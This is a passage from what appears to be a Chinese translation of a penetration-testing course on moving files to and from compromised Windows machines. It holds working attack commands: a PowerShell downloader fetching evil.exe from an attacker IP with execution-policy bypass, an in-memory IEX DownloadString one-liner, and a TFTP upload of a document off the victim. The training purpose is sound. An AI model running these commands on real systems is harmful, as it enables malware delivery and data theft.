
`C:\Users\Offsec>` `echo $webclient = New-Object System.Net.WebClient >>wget.psl`

`C:\Users\Offsec>` `echo $url = "http://10.11.0.4/evil.exe" >>wget.psl`

`C:\Users\Offsec>` `echo $file = "new-exploit.exe" >>wget.psl`

`C:\Users\Offsec>` `echo $webclient.DownloadFile($url,$file) >>wget.psl`

### 列表 479 - 创建 PowerShell HTTP 下载器脚本

现在我们可以使用 PowerShell 运行该脚本并下载我们的文件。然而，为了确保正确且隐蔽的执行，我们在脚本执行中指定了若干选项，如下面的列表 480 所示。

首先，我们必须使用 `-ExecutionPolicy` 关键字和 `Bypass` 值允许执行 PowerShell 脚本（默认情况下是受限制的）。接下来，我们将使用 `-NoLogo` 和 `-NonInteractive` 分别隐藏 PowerShell 标志横幅并抑制交互式 PowerShell 提示符。`-NoProfile` 关键字将阻止 PowerShell 加载默认配置文件（这不是必需的），最后我们使用 `-File` 指定脚本文件。

`C:\Users\Offsec>` `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.psl`

### 列表 480 - 执行 PowerShell HTTP 下载器脚本

我们还可以像下面所示那样将此脚本作为单行命令执行：

`C:\Users\Offsec>` `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')`

### 列表 481 - 作为单行命令执行 PowerShell HTTP 下载器脚本

如果我们想要下载并执行 PowerShell 脚本而无需将其保存到磁盘，我们可以再次使用 `System.Net.WebClient` 类。这是通过结合 `DownloadString` 方法和 `Invoke-Expression` cmdlet（`IEX`）来实现的。

为了演示这一点，我们将在我们的 Kali 机器上创建一个简单的 PowerShell 脚本（列表 482）：

```
kali@kali:/var/www/html$  sudo cat helloworld.psl

Write-Output "Hello World"
```

### 列表 482 - 托管在我们 web 服务器上的 Hello World 脚本

接下来，我们将在被攻陷的 Windows 机器上使用以下命令运行该脚本（列表 483）：

```
C:\Users\Offsec>  powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.psl')

Hello World
```

### 列表 483 - 直接从内存执行远程 PowerShell 脚本

PowerShell 脚本的内容已从我们的 Kali 机器下载并成功执行，而无需将其保存到受害者的硬盘上。

脚注：
399 (Microsoft, 2019). https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6

## 16.2.5 使用 TFTP 上传文件

虽然上述基于 Windows 的文件传输方法适用于 Windows 7 及 Windows Server 2008 R2 之后的所有 Windows 版本，但当我们遇到较旧的操作系统时，可能会遇到问题。虽然 PowerShell 功能强大且常被使用，但它并非在 Windows XP 和 Windows Server 2003 等操作系统上默认安装，而这些系统仍存在于某些生产网络中。虽然 VBScript 和 FTP 客户端均存在并且可以工作，但在本小节中，我们将讨论另一种在现场环境中可能有效的文件传输方法。

TFTP 是一种基于 UDP 的文件传输协议，通常会被企业出口防火墙规则限制。

在渗透测试期间，我们可以使用 TFTP 将文件从较旧的 Windows 操作系统（直至 Windows XP 和 2003）传输出来。这对于非交互式文件传输来说是一个极好的工具，但在运行 Windows 7、Windows 2008 及更新版本的系统中并未默认安装。

出于这些原因，TFTP 在大多数情况下并不是理想的文件传输协议，但在特定情况下，它具有其优势。

在我们学习如何使用 TFTP 传输文件之前，首先需要在 Kali 中安装和配置 TFTP 服务器，并创建一个目录来存储和提供文件。接下来，我们更新目录的所有者权限，以便我们可以向其中写入文件。我们将在 UDP 端口 69 上以守护进程模式运行 `atftpd`，并指示其使用新创建的 `/tftp` 目录：

```
kali@kali:~$ sudo apt update && sudo apt install atftp

kali@kali:~$ sudo mkdir /tftp

kali@kali:~$ sudo chown nobody: /tftp

kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
```

在 Windows 系统上，我们将运行 `tftp` 客户端并使用 `-i` 指定二进制映像传输，接着是我们在 Kali 系统的 IP 地址，使用 `put` 命令发起上传，最后是指定要上传的文件名。

最终命令类似于清单 495 中所示的命令：

```
C:\Users\Offsec> tftp -i 10.11.8.4 put important.docx

Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s
```
